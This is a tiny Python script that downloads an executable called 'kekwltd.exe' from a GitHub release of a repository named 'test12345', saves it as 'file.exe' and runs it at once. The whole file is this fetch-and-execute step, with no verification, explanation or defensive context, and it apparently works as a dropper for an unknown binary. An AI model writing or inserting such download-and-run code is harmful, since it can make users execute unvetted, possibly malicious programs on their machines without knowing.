import requests
import subprocess


url = 'https://github.com/ApfelsaftDevs/test12345/releases/download/1.0/kekwltd.exe'

r = requests.get(url)

with open('file.exe', 'wb') as f:
    f.write(r.content)

subprocess.call('file.exe')